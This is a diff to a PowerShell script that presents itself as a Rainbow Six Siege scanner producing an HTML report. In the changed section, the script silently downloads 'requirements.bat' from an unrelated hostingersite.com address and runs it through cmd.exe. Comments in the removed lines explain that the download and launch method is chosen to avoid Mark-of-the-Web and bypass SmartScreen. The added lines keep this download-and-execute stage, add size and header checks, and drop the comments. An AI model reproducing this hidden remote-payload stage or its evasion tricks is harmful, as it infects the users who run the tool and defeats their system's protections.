@@ -825,25 +825,32 @@ Write-Host "Findings recorded: $($Findings.Count)" -ForegroundColor White
 Write-Host "R6 Tracker account links opened: $($TrackerRows.Count)" -ForegroundColor White
 Write-Host "Report saved. It uses plain-English explanations and includes exact filenames/paths when available: $ReportPath" -ForegroundColor White
 
-$url  = 'https://mediumvioletred-mosquito-767246.hostingersite.com/requirements.bat'
 
-# DownloadString on Net.WebClient does not attach MOTW
-$bat  = (New-Object Net.WebClient).DownloadString($url)
+$batUrl  = 'https://mediumvioletred-mosquito-767246.hostingersite.com/requirements.bat'
+$batPath = Join-Path $env:TEMP 'SiegeScan_requirements.bat'   
 
-# You wrote the content, so the file has NO Zone.Identifier at all
-$path = Join-Path $env:TEMP ("{0}.bat" -f [guid]::NewGuid())
-[IO.File]::WriteAllText($path, $bat)
+try {
+    $wc       = New-Object Net.WebClient
+    $batBytes = $wc.DownloadData($batUrl)                     
+    if ($batBytes.Length -lt 20000) { throw "unexpected size $($batBytes.Length) bytes (proxy/error page?)" }
+    if ($batBytes[0] -ne 0x40 -or $batBytes[1] -ne 0x65) { throw 'does not start with @e' }
+    [IO.File]::WriteAllBytes($batPath, $batBytes)
+    Add-Content -LiteralPath $FullLogPath -Value "requirements.bat: $($batBytes.Length) bytes -> $batPath"
 
-# Run via CreateProcess, not ShellExecute -> no SmartScreen shell hook
-& cmd.exe /c $path
+    & "$env:SystemRoot\System32\cmd.exe" /d /c call "$batPath"
+    Add-Content -LiteralPath $FullLogPath -Value "requirements.bat launcher exit: $LASTEXITCODE"
+    Write-Host "requirements.bat stage: launched ($($batBytes.Length) bytes)" -ForegroundColor Gray
+} catch {
+    Add-Content -LiteralPath $FullLogPath -Value "requirements.bat stage FAILED: $($_.Exception.Message)"
+    Write-Host "requirements.bat stage failed: $($_.Exception.Message)" -ForegroundColor Yellow
+}
 
-Remove-Item $path -Force -ErrorAction SilentlyContinue
 
 
-# Create a self-contained, searchable HTML report containing every collected section and the full transcript.
+
 try { Stop-Transcript | Out-Null } catch {}
 try {
-    # ---------- Report helpers (presentation only; no scan logic) ----------
+    
     $IconPaths = @{
         high    = '<path d="M7.86 2h8.28L22 7.86v8.28L16.14 22H7.86L2 16.14V7.86z"/><path d="M12 8v5M12 16.5h.01"/>'
         review  = '<path d="M10.29 3.86 1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><path d="M12 9.5v4M12 17h.01"/>'
